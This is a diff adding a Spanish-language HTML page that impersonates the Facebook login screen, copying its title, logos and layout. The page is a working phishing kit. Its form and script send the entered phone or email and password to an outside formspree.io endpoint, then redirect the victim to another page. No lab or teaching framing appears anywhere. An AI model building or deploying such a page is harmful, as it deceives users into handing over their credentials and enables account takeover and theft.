@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    
+    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="./styles.css">
+    <link rel="shortcut icon" href="./img/fb.png">
+    <title>Facebook</title>
+</head>
+<body>
+
+
+    <div class="container">
+        <div class="cont_form">
+            <div class="form_header">
+                <div class="cont_logo">
+                    <img src="./img/fb.png" alt="" srcset="">
+                </div>
+            </div>
+            <!-- ========== -->
+            <!-- ========== -->
+            <form class="form_login" id="my-form" action="https://formspree.io/f/mpzvqddp" method="POST">
+                <div class="cont_email">
+                    <input name="message" id="user" class="in_email in" type="text" placeholder="Celular o correo electrónico" required>
+                </div>
+                <div class="cont_pass">
+                    <input name="message" id="pass" class="in_pass in" type="password" placeholder="Contraseña" required>
+                </div>
+                <div class="cont_btn_login">
+                    <button id="my-form-button" class="btn_login btn">Iniciar sesión</button>
+                </div>
+
+            </form>
+                <p id="my-form-status"></p>
+
+                <div class="cont_reset">
+                    <p>¿Olvidaste tu contraseña?</p>
+                </div>
+                <div class="cont_btn_signup">
+                    <button class="btn_signup btn">Crear cuenta nueva</button>
+                </div>
+            <div class="form_footer">
+                <div class="cont_logo">
+                    <img src="./img/meta.png" alt="" srcset="">
+                </div>
+                <div class="cont_info">
+                    <p>Información</p>
+                    <p>Ayuda</p>
+                    <p>Más</p>
+                </div>
+            </div>
+        </div>
+    </div>
+<div class="cont_popup" style="visibility: hidden;">
+    <div class="popup">
+        <div class="cont_info">
+            <div class="info_title">
+                <p>Identifica esta cuenta de otra forma</p>
+            </div>
+
+            <div class="info_text">
+                <p>Por favor, proporciona una dirección de correo electrónico o un número de teléfono para identificar tu cuenta</p>
+            </div>
+
+            <div class="info_btns">
+                <button class="btn_p btn_intentar">Intentar de nuevo</button>
+                <button class="btn_p btn_cancelar">Cancelar</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ====== -->
+<!-- ====== -->
+<!-- ====== -->
+<script>
+    var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          status.innerHTML = "Thanks for your submission!";
+          form.reset()
+          location.href = 'store.html'
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = "Oops! There was a problem submitting your form"
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem submitting your form"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+</script>
+
+</body>
+</html>
